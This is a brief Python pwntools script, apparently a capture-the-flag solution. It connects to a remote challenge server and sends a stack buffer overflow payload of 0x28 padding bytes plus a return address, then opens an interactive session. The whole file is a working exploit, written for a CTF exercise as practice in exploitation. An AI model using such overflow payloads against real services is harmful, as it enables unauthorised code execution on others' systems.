from pwn import *

p = remote('mc.ax', 31944)
e = ELF('./challenge')

p.sendline(b'A'*0x28+p64(0x4013ca))
p.interactive()
